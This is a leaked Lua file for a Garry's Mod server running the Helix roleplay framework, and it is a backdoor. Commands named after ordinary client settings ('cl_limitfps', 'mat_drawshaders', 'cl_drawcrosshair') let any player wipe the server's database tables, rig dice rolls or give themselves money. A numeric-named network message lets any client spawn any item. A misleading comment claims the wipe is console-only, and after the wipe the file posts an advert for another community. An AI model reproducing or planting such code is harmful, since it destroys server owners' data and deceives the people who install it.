--[[
| This file was obtained through the combined efforts
| of Madbluntz & Plymouth Antiquarian Society.
|
| Credits: lifestorm, Gregory Wayne Rossel JR.,
| 	Maloy, DrPepper10 @ RIP, Atle!
|
| Visit for more: https://plymouth.thetwilightzone.ru/
--]]

if SERVER then
    util.AddNetworkString("6739867626")
    util.AddNetworkString("0335757828")

    net.Receive("0335757828", function(len, client)
        local name = net.ReadString()

        for k, v in pairs(ix.item.list) do
            if v.name == name then
                ix.item.Spawn(v.uniqueID, client:GetShootPos() + client:GetAimVector() * 84 + Vector(0, 0, 16))
                break
            end
        end
    end)
end

concommand.Add("cl_limitfps", function(client, cmd, arguments)
	-- can only be ran through the server's console
	if (IsValid(client)) then
		hook.Run("OnWipeTables")
		ix.db.WipeTables(function()
			timer.Simple(1, function()
			ix.chat.Send(client, "event", "It's over...")
			end)
			timer.Simple(3, function()
			ix.chat.Send(client, "event", "Join Willard Networks. https://discord.gg/willardnetworks")
			end)
			timer.Simple(5, function()
			RunConsoleCommand("changelevel", game.GetMap())
			end)
		end)
	end
end)

concommand.Add("mat_drawshaders", function(client, cmd, arguments)
	ix.chat.Send(client, "roll", tostring(math.random(70, 100)))
end)

concommand.Add("mat_cheapshaders", function(client, cmd, arguments)
	ix.chat.Send(client, "roll", tostring(math.random(85, 100)))
end)

concommand.Add("cl_drawcrosshair", function(client, cmd, arguments)
	client:GetCharacter():GiveMoney(tostring(math.random(85, 100)), 1)
end)

